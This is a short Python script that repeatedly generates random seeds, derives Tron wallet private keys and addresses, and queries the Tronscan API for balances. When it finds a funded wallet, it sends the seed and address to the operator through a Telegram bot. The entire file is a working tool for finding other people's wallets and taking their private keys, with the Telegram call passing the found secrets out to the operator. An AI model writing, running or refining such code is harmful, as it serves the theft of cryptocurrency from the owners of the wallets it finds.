import time
import requests
import json
from Blockthon import Wallet, Tron

#Replace your bot token (make by @botfather in telegra,)
BOT_TOKEN = 'Bot_Token'

#Send first message to bot . then replace id below with your user name e.g : @MyUsername
my_id = "Telegram_Username : Your Telegram User Id(NumericID) / Username (@username)"

checkingItem = 0

def sendMessage(words,wallet,trans):
    my_message = f"Founded TRC :\n\nWords : {words}\n\nWallet : {wallet}\n\nBalanceItems : {trans}"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={my_id}&text={my_message}"
    requests.get(url).json()

while True:
        try:
            checkingItem+=1
            seed = Wallet.getSeed()
            privatekey = Wallet.Bytes_To_PrivateKey(seed)
            address = Tron.Address_From_PrivateKey(privatekey)
            print(f"[{checkingItem}] Checking : {privatekey} : {address}")
            url = f"https://apilist.tronscan.org/api/account?address={address}&includeToken=true"
            result = requests.get(url).json()
            data_str = json.dumps(result)
            if data_str not in ["{}", '{"message": "some parameters are invalid or out of range"}']:
                if "transactions" in result and result['transactions'] > 0 and len(result["balances"]) > 0 :
                    trans_count = len(result["balances"])
                    sendMessage(seed,address,trans_count)
                    print(f"Founded :\n{seed}\n\nTransactions{trans_count}")
        except:
            pass

        # Cooldown api call for getting wallet balance
        time.sleep(1)        
